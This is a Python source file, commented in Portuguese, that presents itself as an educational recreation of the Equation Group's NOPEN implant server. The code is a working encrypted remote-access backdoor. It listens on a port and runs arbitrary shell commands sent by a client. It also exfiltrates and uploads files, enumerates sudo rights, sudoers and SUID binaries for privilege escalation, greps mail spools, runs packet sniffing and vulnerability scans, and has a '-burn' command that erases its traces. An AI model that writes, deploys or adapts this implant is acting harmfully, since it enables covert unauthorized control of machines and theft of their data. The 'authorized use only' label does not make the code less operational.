#!/usr/bin/env python3
"""
NOPEN - Remote Administration Tool  |  SERVER
Recriação educacional baseada no NOPEN do Equation Group
Comunicação totalmente criptografada: AES-256-GCM + RSA-2048

Wire protocol (idêntico ao cliente):
  Handshake:
    1. Cliente envia chave pública RSA-2048 (PEM, prefixado 4B big-endian length)
    2. Servidor gera AES-256 session key, cifra com RSA-OAEP, envia (4B len + blob)
  Frames subsequentes (ambas as direções):
    [4B big-endian length][ 12B nonce ][ AES-256-GCM ciphertext + 16B tag ]
"""

import os
import sys
import socket
import threading
import subprocess
import struct
import time
import signal
import logging
import argparse
import hashlib
import base64
import shutil
import platform
import stat
import json
import glob
import re
from datetime import datetime, timezone
from pathlib import Path

# ─── Dependências de criptografia ────────────────────────────────────────────
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.backends import default_backend
    CRYPTO_OK = True
except ImportError:
    CRYPTO_OK = False

# ─── Cores ANSI ──────────────────────────────────────────────────────────────
class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"

# ─── Banner ───────────────────────────────────────────────────────────────────
BANNER = f"""{C.GREEN}{C.BOLD}
  ███╗   ██╗ ██████╗ ██████╗ ███████╗███╗   ██╗
  ████╗  ██║██╔═══██╗██╔══██╗██╔════╝████╗  ██║
  ██╔██╗ ██║██║   ██║██████╔╝█████╗  ██╔██╗ ██║
  ██║╚██╗██║██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║
  ██║ ╚████║╚██████╔╝██║     ███████╗██║ ╚████║
  ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝
{C.RESET}{C.CYAN}  SERVER  |  AES-256-GCM + RSA-2048  |  Multi-client{C.RESET}
{C.DIM}  Recriação educacional — uso autorizado apenas{C.RESET}
"""

# ─── Logger ───────────────────────────────────────────────────────────────────
def _make_logger(log_file: str = None, quiet: bool = False) -> logging.Logger:
    logger = logging.getLogger("nopen_server")
    logger.setLevel(logging.DEBUG)
    fmt = logging.Formatter(
        fmt="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )
    if not quiet:
        sh = logging.StreamHandler(sys.stdout)
        sh.setFormatter(fmt)
        logger.addHandler(sh)
    if log_file:
        fh = logging.FileHandler(log_file)
        fh.setFormatter(fmt)
        logger.addHandler(fh)
    return logger


# ══════════════════════════════════════════════════════════════════════════════
# Camada de criptografia (lado servidor)
# ══════════════════════════════════════════════════════════════════════════════
class ServerCrypto:
    """
    Gerencia o handshake e toda a criptografia de uma sessão individual.
    Cada ClientSession instancia um ServerCrypto próprio.
    """

    def __init__(self):
        self._aesgcm: AESGCM | None = None

    # ── handshake ─────────────────────────────────────────────────────────────
    def do_handshake(self, conn: socket.socket):
        """
        Recebe chave pública RSA do cliente, gera session key AES-256,
        cifra com OAEP e envia de volta.
        """
        # 1. Lê chave pública do cliente
        pub_pem    = _raw_recv(conn)
        client_pub = serialization.load_pem_public_key(pub_pem, backend=default_backend())

        # 2. Gera session key e cifra com a chave pública do cliente
        session_key = os.urandom(32)
        enc_key = client_pub.encrypt(
            session_key,
            asym_padding.OAEP(
                mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        _raw_send(conn, enc_key)

        # 3. Inicializa AES-GCM com a session key
        self._aesgcm = AESGCM(session_key)

    # ── encrypt / decrypt ─────────────────────────────────────────────────────
    def encrypt(self, plaintext: bytes) -> bytes:
        nonce = os.urandom(12)
        ct    = self._aesgcm.encrypt(nonce, plaintext, None)
        frame = nonce + ct
        return struct.pack(">I", len(frame)) + frame

    def decrypt(self, frame: bytes) -> bytes:
        nonce = frame[:12]
        ct    = frame[12:]
        return self._aesgcm.decrypt(nonce, ct, None)

    @property
    def ready(self) -> bool:
        return self._aesgcm is not None


# ══════════════════════════════════════════════════════════════════════════════
# Utilidades de socket (shared)
# ══════════════════════════════════════════════════════════════════════════════
def _recvn(conn: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Conexão encerrada pelo cliente")
        buf += chunk
    return buf

def _raw_send(conn: socket.socket, data: bytes):
    conn.sendall(struct.pack(">I", len(data)) + data)

def _raw_recv(conn: socket.socket) -> bytes:
    raw = _recvn(conn, 4)
    n   = struct.unpack(">I", raw)[0]
    return _recvn(conn, n)


# ══════════════════════════════════════════════════════════════════════════════
# Executor de comandos do servidor
# ══════════════════════════════════════════════════════════════════════════════
class CommandExecutor:
    """
    Interpreta os comandos recebidos do cliente e devolve a resposta em string.
    Cada ClientSession tem seu próprio CommandExecutor (estado de CWD isolado).
    """

    def __init__(self, session_id: str, logger: logging.Logger):
        self.session_id = session_id
        self.log        = logger
        self.cwd        = os.path.expanduser("~")
        self._env       = dict(os.environ)
        self._alive     = True      # False = sinaliza encerramento da sessão

    # ── Dispatch principal ────────────────────────────────────────────────────
    def run(self, raw_cmd: str) -> str:
        cmd = raw_cmd.strip()
        self.log.info(f"[{self.session_id}] CMD: {cmd!r}")

        if not cmd:
            return ""

        # ── Controle de sessão ────────────────────────────────────────────────
        if cmd in ("exit", "-exit", "quit"):
            self._alive = False
            return "__EXIT__"

        if cmd == "-burn":
            self._alive = False
            self._do_burn()
            return "__BURN__"

        if cmd == "-pid":
            return str(os.getpid())

        if cmd == "-status":
            return self._do_status()

        if cmd == "-time":
            return datetime.now(timezone.utc).strftime("%a %b %d %H:%M:%S UTC %Y")

        # ── Ambiente ──────────────────────────────────────────────────────────
        if cmd == "-getenv":
            return "\n".join(f"{k}={v}" for k, v in self._env.items())

        if cmd.startswith("-setenv "):
            return self._do_setenv(cmd[8:].strip())

        if cmd == "-elevate":
            return self._do_elevate()

        # ── Rede ─────────────────────────────────────────────────────────────
        if cmd == "-ifconfig":
            return self._shell("ip addr show 2>/dev/null || ifconfig 2>/dev/null")

        if cmd.startswith("-nslookup "):
            host = cmd[10:].strip()
            return self._shell(f"nslookup {host} 2>/dev/null || host {host} 2>/dev/null")

        if cmd.startswith("-ping "):
            return self._shell(f"ping -c 4 {cmd[6:].strip()}")

        if cmd.startswith("-trace "):
            return self._shell(f"traceroute {cmd[7:].strip()} 2>/dev/null || tracert {cmd[7:].strip()} 2>/dev/null")

        if cmd.startswith("-comptine "):
            return self._shell(f"traceroute -I {cmd[10:].strip()} 2>/dev/null")

        if cmd.startswith("-scan"):
            args = cmd[5:].strip() or "127.0.0.1"
            return self._shell(f"nmap -sV --open {args} 2>/dev/null")

        if cmd.startswith("-sentry "):
            args = cmd[8:].strip()
            return self._shell(f"tcpdump {args} -c 30 -nn 2>/dev/null")

        if cmd.startswith("-nslookup"):
            return self._shell(f"nslookup {cmd[10:].strip()}")

        # ── Arquivos e diretórios ─────────────────────────────────────────────
        if cmd.startswith("cd ") or cmd == "cd":
            return self._do_cd(cmd)

        if cmd.startswith("-cd "):
            return self._do_cd("cd " + cmd[4:].strip())

        if cmd == "-cdp":
            return self.cwd

        if cmd.startswith("-ls"):
            args = cmd[3:].strip()
            return self._shell(f"ls {args}")

        if cmd.startswith("-find "):
            return self._shell(f"find {cmd[6:].strip()}")

        if cmd.startswith("-cat "):
            return self._shell(f"cat {cmd[5:].strip()}")

        if cmd.startswith("-tail "):
            return self._shell(f"tail {cmd[6:].strip()}")

        if cmd.startswith("-grep "):
            return self._shell(f"grep {cmd[6:].strip()}")

        if cmd.startswith("-strings "):
            return self._shell(f"strings {cmd[9:].strip()}")

        if cmd.startswith("-cksum "):
            f = cmd[7:].strip()
            return self._shell(f"md5sum {f} && sha256sum {f}")

        if cmd.startswith("-touch "):
            return self._shell(f"touch {cmd[7:].strip()}")

        if cmd.startswith("-get "):
            return self._do_get(cmd[5:].strip())

        if cmd.startswith("-put "):
            return self._do_put_base64(cmd[5:].strip())

        if cmd.startswith("-lput ") or cmd.startswith("-upload "):
            parts = cmd.split(None, 2)
            if len(parts) >= 2:
                return self._do_put_base64(parts[1])
            return "[erro] uso: -lput <base64data> <destino>"

        if cmd.startswith("-gs "):
            pattern = cmd[4:].strip()
            return self._shell(f"find / -name '{pattern}' 2>/dev/null | head -30")

        if cmd.startswith("-mailgrep "):
            args = cmd[10:].strip()
            return self._shell(f"grep -r {args} /var/spool/mail/ 2>/dev/null | head -30")

        if cmd.startswith("-cklist "):
            return self._do_cklist(cmd[8:].strip())

        # ── Redirecionamento / tunelamento (respostas informativas) ───────────
        if cmd.startswith(("-tunnel ", "-rtun ", "-nrtun ", "-irtun ",
                            "-stun ", "-sutun ", "-fixudp ", "-jackpop ",
                            "-rawsend ", "-listen ", "-chuli ")):
            return f"[servidor] recebeu: {cmd}\n[info] tunelamento gerido no lado do servidor"

        if cmd == "-vscan":
            return self._shell("nmap -sV --script=vuln 127.0.0.1 2>/dev/null | head -60")

        # ── Shell direto ──────────────────────────────────────────────────────
        return self._shell(cmd)

    # ── Helpers internos ──────────────────────────────────────────────────────
    def _shell(self, cmd: str, timeout: int = 60) -> str:
        try:
            r = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                cwd=self.cwd,
                env=self._env,
                timeout=timeout
            )
            out = r.stdout + r.stderr
            return out if out else "[ok] sem saída"
        except subprocess.TimeoutExpired:
            return "[erro] timeout do comando"
        except Exception as e:
            return f"[erro] {e}"

    def _do_cd(self, cmd: str) -> str:
        parts = cmd.split(None, 1)
        path  = os.path.expanduser(parts[1].strip()) if len(parts) > 1 else os.path.expanduser("~")
        try:
            os.chdir(path)
            self.cwd = os.getcwd()
            return f"[cwd] {self.cwd}"
        except Exception as e:
            return f"[erro] {e}"

    def _do_setenv(self, kv: str) -> str:
        if "=" in kv:
            k, v = kv.split("=", 1)
            self._env[k] = v
            os.environ[k] = v
            return f"[ok] {k}={v}"
        return "[erro] formato: VAR=valor"

    def _do_elevate(self) -> str:
        lines = []
        lines.append(self._shell("id"))
        lines.append(self._shell("sudo -l 2>/dev/null"))
        lines.append(self._shell("cat /etc/sudoers 2>/dev/null | head -20"))
        lines.append(self._shell("find / -perm -4000 -type f 2>/dev/null | head -20"))
        return "\n".join(lines)

    def _do_get(self, path: str) -> str:
        """Lê arquivo e devolve conteúdo (texto) ou base64 (binário)."""
        try:
            fpath = os.path.expanduser(path.strip())
            with open(fpath, "rb") as f:
                data = f.read()
            try:
                return data.decode("utf-8")
            except UnicodeDecodeError:
                return "[base64]\n" + base64.b64encode(data).decode()
        except Exception as e:
            return f"[erro] {e}"

    def _do_put_base64(self, args: str) -> str:
        """Recebe 'base64data destino' e grava no disco."""
        parts = args.split(None, 1)
        if len(parts) < 2:
            return "[erro] formato: <base64data> <caminho_destino>"
        b64, dest = parts
        dest = os.path.expanduser(dest.strip())
        try:
            data = base64.b64decode(b64)
            with open(dest, "wb") as f:
                f.write(data)
            return f"[ok] {len(data)} bytes gravados em {dest}"
        except Exception as e:
            return f"[erro] {e}"

    def _do_cklist(self, pattern: str) -> str:
        """Verifica existência e hash de arquivos por glob/padrão."""
        lines = []
        for fpath in glob.glob(os.path.expanduser(pattern)):
            try:
                h = hashlib.sha256(open(fpath, "rb").read()).hexdigest()[:16]
                s = os.path.getsize(fpath)
                lines.append(f"{h}  {s:>10}  {fpath}")
            except Exception as e:
                lines.append(f"[erro] {fpath}: {e}")
        return "\n".join(lines) if lines else "[vazio] nenhum arquivo encontrado"

    def _do_status(self) -> str:
        uname = platform.uname()
        return (
            f"Sessão    : {self.session_id}\n"
            f"PID       : {os.getpid()}\n"
            f"Usuário   : {os.getlogin() if hasattr(os, 'getlogin') else 'n/a'}\n"
            f"CWD       : {self.cwd}\n"
            f"Hostname  : {uname.node}\n"
            f"OS        : {uname.system} {uname.release} {uname.machine}\n"
            f"Python    : {sys.version.split()[0]}\n"
            f"Hora UTC  : {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}\n"
        )

    def _do_burn(self):
        """Remove rastros do servidor: logs, arquivos temporários."""
        targets = [
            "/tmp/.nopen*",
            "/tmp/.nopen_server*",
        ]
        for pattern in targets:
            for fpath in glob.glob(pattern):
                try:
                    os.remove(fpath)
                except Exception:
                    pass


# ══════════════════════════════════════════════════════════════════════════════
# Sessão de cliente individual
# ══════════════════════════════════════════════════════════════════════════════
class ClientSession:
    def __init__(self, conn: socket.socket, addr: tuple, logger: logging.Logger):
        self.conn       = conn
        self.addr       = addr
        self.log        = logger
        self.session_id = hashlib.md5(os.urandom(8)).hexdigest()[:8].upper()
        self.crypto     = ServerCrypto()
        self.executor   = CommandExecutor(self.session_id, logger)
        self.start_time = datetime.now(timezone.utc)
        self._thread: threading.Thread | None = None

    def start(self):
        self._thread = threading.Thread(target=self._run, daemon=True, name=f"sess-{self.session_id}")
        self._thread.start()

    def _run(self):
        ip, port = self.addr
        self.log.info(f"[{self.session_id}] Nova conexão de {ip}:{port}")

        try:
            # ── Handshake criptográfico ───────────────────────────────────────
            self.crypto.do_handshake(self.conn)
            self.log.info(f"[{self.session_id}] Handshake AES-256-GCM concluído")

            # ── Loop de comandos ─────────────────────────────────────────────
            while self.executor._alive:
                try:
                    raw_frame = _raw_recv(self.conn)
                    cmd       = self.crypto.decrypt(raw_frame).decode(errors="replace")
                    response  = self.executor.run(cmd)
                    enc_resp  = self.crypto.encrypt(response.encode())
                    self.conn.sendall(enc_resp)

                    if response in ("__EXIT__", "__BURN__"):
                        break

                except ConnectionError:
                    self.log.info(f"[{self.session_id}] Cliente desconectou")
                    break
                except Exception as e:
                    self.log.warning(f"[{self.session_id}] Erro no loop: {e}")
                    try:
                        err_msg = f"[servidor-erro] {e}"
                        self.conn.sendall(self.crypto.encrypt(err_msg.encode()))
                    except Exception:
                        break

        except Exception as e:
            self.log.error(f"[{self.session_id}] Erro fatal na sessão: {e}")
        finally:
            uptime = str(datetime.now(timezone.utc) - self.start_time).split(".")[0]
            self.log.info(f"[{self.session_id}] Sessão encerrada | uptime {uptime}")
            try:
                self.conn.close()
            except Exception:
                pass

    def is_alive(self) -> bool:
        return self._thread is not None and self._thread.is_alive()


# ══════════════════════════════════════════════════════════════════════════════
# Servidor principal
# ══════════════════════════════════════════════════════════════════════════════
class NOPENServer:
    def __init__(
        self,
        host: str = "0.0.0.0",
        port: int = 4444,
        max_clients: int = 16,
        log_file: str = None,
        quiet: bool = False,
        keepalive: bool = True,
    ):
        self.host        = host
        self.port        = port
        self.max_clients = max_clients
        self.log         = _make_logger(log_file, quiet)
        self.keepalive   = keepalive
        self._sessions: list[ClientSession] = []
        self._lock       = threading.Lock()
        self._stop       = threading.Event()
        self._sock: socket.socket | None = None
        self._server_id  = hashlib.md5(os.urandom(8)).hexdigest()[:8].upper()

    # ── Inicialização ────────────────────────────────────────────────────────
    def start(self):
        if not CRYPTO_OK:
            self.log.error("Módulo 'cryptography' não instalado. Execute: pip install cryptography")
            sys.exit(1)

        print(BANNER)
        self.log.info(f"Servidor NOPEN iniciado  [ID={self._server_id}]")
        self.log.info(f"Escutando em {self.host}:{self.port}  |  max_clients={self.max_clients}")

        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        if self.keepalive:
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            try:
                self._sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE,  60)
                self._sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
                self._sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT,    5)
            except (AttributeError, OSError):
                pass  # Windows não tem KEEPIDLE

        self._sock.bind((self.host, self.port))
        self._sock.listen(self.max_clients)
        self._sock.settimeout(1.0)

        # Sinal para encerramento limpo
        signal.signal(signal.SIGINT,  self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

        # Thread de limpeza de sessões mortas
        threading.Thread(target=self._reaper, daemon=True, name="reaper").start()

        self._accept_loop()

    # ── Loop de aceitação ────────────────────────────────────────────────────
    def _accept_loop(self):
        self.log.info(f"{C.GREEN}[+] Aguardando conexões...{C.RESET}")
        while not self._stop.is_set():
            try:
                conn, addr = self._sock.accept()
                conn.settimeout(300)  # 5 min timeout por operação

                with self._lock:
                    active = [s for s in self._sessions if s.is_alive()]
                    if len(active) >= self.max_clients:
                        self.log.warning(f"Limite de clientes atingido ({self.max_clients}), rejeitando {addr}")
                        conn.close()
                        continue
                    self._sessions = active

                sess = ClientSession(conn, addr, self.log)
                with self._lock:
                    self._sessions.append(sess)
                sess.start()

            except socket.timeout:
                continue
            except OSError:
                if not self._stop.is_set():
                    raise

        self._cleanup()

    # ── Reaper — limpa sessões mortas ─────────────────────────────────────────
    def _reaper(self):
        while not self._stop.is_set():
            time.sleep(30)
            with self._lock:
                before = len(self._sessions)
                self._sessions = [s for s in self._sessions if s.is_alive()]
                after  = len(self._sessions)
            if before != after:
                self.log.debug(f"Reaper: removeu {before - after} sessão(ões) morta(s). Ativas: {after}")

    # ── Encerramento ──────────────────────────────────────────────────────────
    def _signal_handler(self, signum, frame):
        print()
        self.log.info("Sinal de encerramento recebido. Parando servidor...")
        self._stop.set()

    def _cleanup(self):
        self.log.info("Encerrando todas as sessões...")
        with self._lock:
            for sess in self._sessions:
                try: sess.conn.close()
                except Exception: pass
        if self._sock:
            try: self._sock.close()
            except Exception: pass
        self.log.info("Servidor encerrado.")

    @property
    def active_sessions(self) -> int:
        with self._lock:
            return sum(1 for s in self._sessions if s.is_alive())


# ══════════════════════════════════════════════════════════════════════════════
# Entrypoint
# ══════════════════════════════════════════════════════════════════════════════
def main():
    parser = argparse.ArgumentParser(
        description="NOPEN Server — Remote Administration Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=r"""
Exemplos:
  # Escuta em todas as interfaces, porta 4444 (padrão):
  python3 nopen_server.py

  # Porta e bind customizados:
  python3 nopen_server.py -H 0.0.0.0 -p 9000

  # Com log em arquivo, modo silencioso no console:
  python3 nopen_server.py -p 4444 --log /var/log/nopen.log --quiet

  # Limite de 8 clientes simultâneos:
  python3 nopen_server.py --max-clients 8

  # Instala dependência:
  python3 nopen_server.py --install-deps

──────────────────────────────────────────────────────────
  Conectar o cliente:
    python3 nopen_client.py -H <server_ip> -p 4444
──────────────────────────────────────────────────────────
"""
    )
    parser.add_argument("-H", "--host",
                        default="0.0.0.0",
                        help="Interface de bind (padrão: 0.0.0.0)")
    parser.add_argument("-p", "--port",
                        type=int, default=4444,
                        help="Porta TCP (padrão: 4444)")
    parser.add_argument("--max-clients",
                        type=int, default=16,
                        help="Máximo de clientes simultâneos (padrão: 16)")
    parser.add_argument("--log",
                        default=None,
                        help="Arquivo de log (opcional)")
    parser.add_argument("--quiet",
                        action="store_true",
                        help="Suprime saída no console (útil com --log)")
    parser.add_argument("--no-keepalive",
                        action="store_true",
                        help="Desativa TCP keepalive")
    parser.add_argument("--install-deps",
                        action="store_true",
                        help="Instala dependências: pip install cryptography")
    args = parser.parse_args()

    if args.install_deps:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "cryptography"],
            check=True
        )
        print("[+] Dependências instaladas com sucesso.")
        sys.exit(0)

    if not CRYPTO_OK:
        print(f"{C.RED}[!] Módulo 'cryptography' não encontrado.{C.RESET}")
        print(f"    Execute: {C.CYAN}python3 nopen_server.py --install-deps{C.RESET}")
        sys.exit(1)

    server = NOPENServer(
        host        = args.host,
        port        = args.port,
        max_clients = args.max_clients,
        log_file    = args.log,
        quiet       = args.quiet,
        keepalive   = not args.no_keepalive,
    )
    server.start()


if __name__ == "__main__":
    main()
